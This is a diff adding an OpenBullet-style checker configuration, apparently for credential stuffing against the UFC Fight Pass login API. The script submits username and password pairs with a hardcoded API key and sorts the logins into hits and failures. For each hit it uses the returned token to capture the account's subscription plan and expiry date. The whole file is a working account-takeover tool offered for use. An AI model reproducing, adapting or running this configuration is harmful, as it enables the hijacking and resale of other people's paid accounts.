@@ -1,0 +1,97 @@
+[SETTINGS]
+{
+  "Name": "UFC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-11T20:35:19.1721168-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/login" 
+  CONTENT "{\"id\":\"<USER>\",\"secret\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: dce-frontoffice.imggaming.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 49" 
+  HEADER "Realm: dce.ufc" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "x-app-var: 5.6.1" 
+  HEADER "app: dice" 
+  HEADER "x-api-key: 857a1e5d-e35e-4fdf-805b-a87b6f8364bf" 
+  HEADER "Origin: https://ufcfightpass.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://ufcfightpass.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "authorisationToken" 
+  KEYCHAIN Failure OR 
+    KEY "failedAuthentication" 
+
+PARSE "<SOURCE>" LR "authorisationToken\":\"" "\"" -> VAR "TOK" 
+
+REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/user/licence" 
+  
+  HEADER "Host: dce-frontoffice.imggaming.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Realm: dce.ufc" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Authorization: Bearer <TOK>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "x-app-var: 5.6.1" 
+  HEADER "app: dice" 
+  HEADER "x-api-key: 857a1e5d-e35e-4fdf-805b-a87b6f8364bf" 
+  HEADER "Origin: https://ufcfightpass.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://ufcfightpass.com/account" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" EqualTo "[]" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" NotEqualTo "[]" 
+
+PARSE "<SOURCE>" LR "name\":\"" "\"" CreateEmpty=FALSE -> CAP "PLAN" 
+
+PARSE "<SOURCE>" LR "expiryTimestamp\":" "," -> VAR "exp" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd" "<exp>" -> CAP "EXP" 
+
